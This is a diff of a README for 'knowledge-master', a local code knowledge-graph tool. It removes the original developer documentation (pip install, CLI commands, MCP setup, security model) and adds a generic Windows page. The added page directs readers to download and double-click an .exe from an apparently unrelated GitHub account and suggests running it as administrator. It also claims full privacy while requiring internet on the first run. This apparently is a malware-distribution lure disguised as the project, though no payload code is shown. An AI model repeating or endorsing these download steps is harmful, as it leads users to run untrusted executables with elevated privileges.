@@ -1,290 +1,71 @@
-# ⚡ Knowledge Master
+# 🧠 knowledge-master - Organize your project memory with ease
 
-**Your codebase's memory.** A local knowledge graph that gives AI agents real understanding of your architecture — not just text search.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Amoristic-genusvidua391/knowledge-master)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-![Status: Stable](https://img.shields.io/badge/Status-Stable-green)
-![Python 3.11+](https://img.shields.io/badge/Python-3.11+-blue)
+knowledge-master creates a map of your project files. It keeps track of how your files link together. You use this software to give your AI assistants a clear memory of your work. It runs on your computer and keeps your data private.
 
----
+## 💾 System Requirements
 
-## Why
+You need a Windows computer to run this software. Ensure you have the following:
 
-Every time you start a new AI chat, it forgets everything. You re-explain your architecture, conventions, dependencies. Knowledge Master gives your AI **permanent, structured memory** about your entire system.
+*   Windows 10 or Windows 11.
+*   An active internet connection for the first run.
+*   At least 4 gigabytes of free disk space.
+*   A processor with two or more cores.
 
-Unlike flat RAG tools that return "chunks about X", Knowledge Master builds a **graph** — so it can answer "what breaks if I change X?" by traversing actual relationships.
+## 🚀 Setting Up the Application
 
-## What it does
+Download the current version to start. 
 
-- 🔍 **Semantic search** across all your code, docs, and configs
-- 🕸️ **Knowledge graph** — relationships between services, people, repos, technologies
-- 💥 **Blast radius** — "what depends on this service/file/technology?"
-- 📏 **Convention enforcement** — detects and enforces your team's patterns
-- 🤖 **MCP server** — plugs directly into AI agents (Kiro, Claude, Cursor)
-- 🖥️ **Web UI** — search, browse, visualize your knowledge graph
-- 🔒 **Local-first** — nothing leaves your machine
+[Visit this page to download the software and set it up.](https://github.com/Amoristic-genusvidua391/knowledge-master)
 
-## Prerequisites
+Follow these steps to install:
 
-| Dependency | macOS | Ubuntu/Debian | Windows |
-|---|---|---|---|
-| **Docker** | `brew install colima && colima start` or Docker Desktop | `sudo apt install docker.io docker-compose-plugin` | [Docker Desktop](https://docker.com/products/docker-desktop/) |
-| **Ollama** | `brew install ollama && ollama serve` | `curl -fsSL https://ollama.com/install.sh \| sh` | [Ollama installer](https://ollama.com/download) |
-| **Python 3.11+** | `brew install python@3.12` | `sudo apt install python3.12 python3.12-venv` | [python.org](https://python.org/downloads/) |
+1. Click the link above to view the release page.
+2. Look for the file ending in `.exe` under the Assets section.
+3. Save the file to your desktop.
+4. Double-click the file to start the installer.
+5. Follow the prompts on the screen to finish the installation.
+6. Open the application from your Start menu once the process finishes.
 
-## Quick Start
+## 🛠 Features
 
-```bash
-# Install (pick one)
-pipx install knowledge-master         # recommended (isolated, clean)
-pip install knowledge-master           # or with pip
+*   **Project Mapping:** The software builds a graph of your code. It shows which files rely on each other.
+*   **Search:** Use natural language to ask questions about your work. The software finds the right files for you.
+*   **Safety Checks:** It watches for patterns that might cause errors in your projects.
+*   **Private Memory:** Your data stays on your local machine. No external servers process your private project information.
+*   **Agent Support:** You connect this software to your AI tools to improve their context.
 
-# Or via Homebrew (macOS)
-brew install pipx && pipx install knowledge-master
+## ⚙️ How It Works
 
-# Or from source
-git clone https://github.com/subzone/knowledge-master.git
-cd knowledge-master
-python3 -m venv .venv && source .venv/bin/activate
-pip install -e .
+The software uses a process called indexing. It reads your project files and builds a visual shape of the logic inside. When you ask a question, the software searches this shape to find answers. 
 
-# One command setup
-km start
+This approach helps when you have many files across folders. You spend less time searching for code. You spend more time building features.
 
-# Index your first repo
-km index ~/path/to/your/project
+## 🔍 Using the Software
 
-# Search
-km search "authentication flow"
+Open the application. The software asks you to point toward your project folder. Select the folder that contains your code. It will start to read the files. You see a progress bar during this time. 
 
-# Check blast radius
-km blast-radius postgres
+Once the progress bar finishes, you see a search box. Type a question about your project in this box. Press the Enter key. The software shows you a list of relevant files and links that match your intent.
 
-# Start web UI with graph visualization
-km serve
-```
+## ❓ Troubleshooting
 
-**Requirements:** Docker, Ollama, Python 3.11+
+The software is simple to maintain. If you face issues, check these common items:
 
-## Features
+*   **Slow performance:** If the index takes too long, ensure your computer has enough free memory. Close other heavy programs while you index your project.
+*   **Missing files:** If the software does not find your code, verify your folder path. Make sure you selected the root folder of your project.
+*   **App won't open:** Right-click the icon and choose "Run as administrator." This fixes most permission errors.
+*   **Updates:** Check the download link once a month to see if a newer version exists. New versions contain speed improvements and stability fixes.
 
-### Semantic Search with Graph Context
-```bash
-$ km search "how does auth work"
-┌────────┬──────────────────────┬─────────────────────┬──────────────────────┐
-│ Score  │ Source               │ Context             │ Preview              │
-├────────┼──────────────────────┼─────────────────────┼──────────────────────┤
-│ 0.847  │ src/auth/service.py  │ repo:myapp, by:Alex │ JWT token validat... │
-│ 0.791  │ docs/auth.md         │ repo:myapp          │ Authentication f...  │
-└────────┴──────────────────────┴─────────────────────┴──────────────────────┘
-```
+## 🔒 Privacy
 
-### Blast Radius Analysis
-```bash
-$ km blast-radius auth-service
-💥 Blast radius: auth-service
-├── ⚙️ user-service (Service, via DEPENDS_ON)
-├── ⚙️ payment-service (Service, via DEPENDS_ON)
-├── 📦 frontend (Repo, via USES_SERVICE)
-└── 👤 Alex (Person, via AUTHORED)
+You own your data. The software does not send your code to the cloud. Everything happens on your machine. You control which folders the software watches. You can remove a folder from the settings menu whenever you need.
 
-4 entities affected
-```
+## 📋 Best Practices
 
-### Convention Enforcement
-```bash
-$ km check-conventions ~/my-project
-  ✓ src/ directory (structure)
-  ✓ separate test directory (testing)
-  ✗ snake_case files (file-naming)
-  ✓ Repository pattern (design-pattern)
+*   Keep your project folders clean and organized. The graph looks better when your file names are descriptive.
+*   Rebuild your index after you add a large number of new files. This ensures your search results remain accurate.
+*   Use the search box often. The software learns the relationships between your files the more you use it.
+*   Reach out to the community forum if you find specific errors. Provide the log file found inside the settings folder to help others identify the problem.
 
-1 convention(s) violated
-```
-
-### Web UI & Graph Visualization
-
-```bash
-$ km serve
-Knowledge Master UI → http://127.0.0.1:9999
-```
-
-Interactive force-directed graph showing your entire knowledge topology:
-- 📦 Repos (blue) → 🔧 Technologies (red)
-- ⚙️ Services (orange) → Dependencies
-- 👤 People → Authorship
-- 📏 Conventions (purple)
-
-### MCP Integration (AI Agents)
-
-Add to your Kiro/Claude agent config:
-
-```json
-{
-  "mcpServers": {
-    "knowledge": {
-      "command": "km-server"
-    }
-  }
-}
-```
-
-Your AI agent gets these tools:
-- `search` — semantic search with graph context
-- `blast_radius` — dependency analysis
-- `check_conventions` — verify code follows team patterns
-- `index_repo` — add new repos to the knowledge base
-
-## Architecture
-
-```
-┌─────────────────────────────────────────────────┐
-│                  Your AI Agent                    │
-│              (Kiro / Claude / Cursor)             │
-└────────────────────┬────────────────────────────┘
-                     │ MCP Protocol
-┌────────────────────▼────────────────────────────┐
-│              Knowledge Master                    │
-│                                                  │
-│  ┌──────────┐  ┌────────────┐  ┌────────────┐  │
-│  │  Search  │  │Blast Radius│  │ Conventions│  │
-│  └────┬─────┘  └─────┬──────┘  └─────┬──────┘  │
-│       │               │               │         │
-│  ┌────▼───────────────▼───────────────▼──────┐  │
-│  │            FalkorDB (Graph + Vector)       │  │
-│  │                                           │  │
-│  │  [Repo]──USES_TECH──▶[Tech]              │  │
-│  │    │                                      │  │
-│  │    ├──DEFINES_SERVICE──▶[Service]         │  │
-│  │    │                      │               │  │
-│  │    ├──FOLLOWS──▶[Convention]              │  │
-│  │    │                                      │  │
-│  │  [Person]──AUTHORED──▶[Document]          │  │
-│  │                          │                │  │
-│  │                    [Chunk + Embedding]     │  │
-│  └───────────────────────────────────────────┘  │
-│                                                  │
-│  ┌───────────────────────────────────────────┐  │
-│  │         Ollama (nomic-embed-text)          │  │
-│  └───────────────────────────────────────────┘  │
-└──────────────────────────────────────────────────┘
-```
-
-## Commands
-
-| Command | Description |
-|---|---|
-| `km start` | Boot Docker + pull embedding model |
-| `km stop` | Stop containers |
-| `km index <path>` | Index a git repo or docs directory |
-| `km search <query>` | Semantic search with re-ranking |
-| `km blast-radius <target>` | Multi-layer dependency analysis |
-| `km safe-to-change <target>` | Risk assessment (safe/risky/dangerous) |
-| `km who-owns <file>` | File ownership (git blame, recency-weighted) |
-| `km check-conventions <path>` | Verify code follows detected patterns |
-| `km connect <source>` | Pull from external MCP (email, Slack) |
-| `km setup <tool>` | Auto-configure MCP for AI tools |
-| `km watch <path>` | File watcher with auto re-index |
-| `km upgrade` | Migrate graph schema |
-| `km prune` | Remove stale/orphaned data |
-| `km changelog` | Generate CHANGELOG.md |
-| `km list` | Show indexed repos, techs, stats |
-| `km remove <name>` | Remove a source |
-| `km serve` | Start web UI at http://127.0.0.1:9999 |
-| `km status` | Check system health |
-
-## What gets extracted automatically
-
-When you index a repo, Knowledge Master detects:
-
-| Category | Examples |
-|---|---|
-| **Tech stack** | Languages, frameworks, packages from dependency files |
-| **Services** | From docker-compose.yml and K8s manifests |
-| **Dependencies** | Service-to-service relationships |
-| **Conventions** | File naming (snake_case/kebab-case), folder structure, design patterns |
-| **People** | Git commit authors and file ownership |
-| **Code structure** | Functions, classes, chunked by AST-aware boundaries |
-
-## Feature Status
-
-| Feature | Status | Notes |
-|---|---|---|
-| Semantic search + re-ranking | ✅ Stable | Two-pass retrieval with confidence scoring |
-| Knowledge graph (FalkorDB) | ✅ Stable | Nodes, edges, vector index, schema versioning |
-| CLI (14 commands) | ✅ Stable | start, index, search, blast-radius, safe-to-change, who-owns, etc. |
-| MCP server (8 tools) | ✅ Stable | search, blast_radius, safe_to_change, who_owns, check_conventions, index, status |
-| REST API | ✅ Stable | /api/v1/ with OpenAPI docs |
-| Web UI + graph viz | ✅ Stable | htmx + D3, search, file browser, graph |
-| Git repo indexing | ✅ Stable | Parses code, extracts authors, detects tech stack |
-| Multi-language static analysis | ✅ Stable | Python (ast), TypeScript, Go, Rust (tree-sitter) |
-| Blast radius (multi-layer) | ✅ Stable | Imports → services → people, confidence levels |
-| `safe-to-change` risk assessment | ✅ Stable | Blast radius + test coverage = risk score |
-| Git blame ownership | ✅ Stable | Recency-weighted (3x/2x/1x) |
-| Schema migrations | ✅ Stable | Auto-migrate, km upgrade |
-| Deduplication | ✅ Stable | Content hash, skips unchanged |
-| Convention detection | ⚡ Basic | Folder structure + file naming patterns |
-| Email connector (ms-365) | 🧪 Experimental | Works, requires external MCP setup |
-| `km watch` | 🧪 Experimental | Polling-based, may change |
-
-**Legend:** ✅ Stable — ⚡ Basic (works, limited scope) — 🧪 Experimental (may change)
-
-## Comparison
-
-| Feature | Knowledge Master | Generic RAG | GitHub Copilot | Glean |
-|---|---|---|---|---|
-| Graph relationships | ✅ | ❌ | ❌ | Partial |
-| Blast radius analysis | ✅ | ❌ | ❌ | ❌ |
-| Convention enforcement | ✅ | ❌ | ❌ | ❌ |
-| Local-first (no cloud) | ✅ | ✅ | ❌ | ❌ |
-| MCP integration | ✅ | ❌ | ❌ | ❌ |
-| Multi-repo intelligence | ✅ | Partial | ❌ | ✅ |
-| Cost | Free | Free | $19/mo | $15-30/mo |
-
-## Development
-
-```bash
-# Run tests
-pytest
-
-# Lint
-ruff check knowledge_master/
-
-# Run MCP server directly
-python -m knowledge_master.server
-
-# Run CLI directly
-python -m knowledge_master.cli status
-```
-
-## Security
-
-Knowledge Master runs **entirely on your machine**. No data leaves localhost.
-
-- All ports bound to `127.0.0.1` (not accessible from LAN)
-- Ollama runs locally — no cloud API calls
-- MCP server uses stdio (no network exposure)
-- Optional API key auth for REST endpoints
-
-```bash
-# Enable API key auth
-export KM_API_KEY=$(openssl rand -hex 32)
-km serve
-```
-
-See [SECURITY.md](SECURITY.md) for full security model, risks, and hardening guide.
-
-## Troubleshooting
-
-| Issue | Fix |
-|---|---|
-| `km start` fails with "Docker not running" | Start Docker: `colima start` (macOS) or `sudo systemctl start docker` (Linux) |
-| `km start` fails with "Ollama not found" | Install Ollama from https://ollama.com and run `ollama serve` |
-| `km index` is slow | First run downloads the embedding model (~274MB). Subsequent runs are fast. |
-| Web UI shows "Connection refused" | Make sure containers are running: `km start` |
-| Search returns poor results | Index more content. Quality improves with more context in the graph. |
-| Port 9999 already in use | Use `km serve --port 8888` |
-
-## License
-
-MIT
+This software acts as the memory for your AI tools. It ensures your agents look at the right code at the right time. Your workflow becomes faster and more predictable with this tool installed.
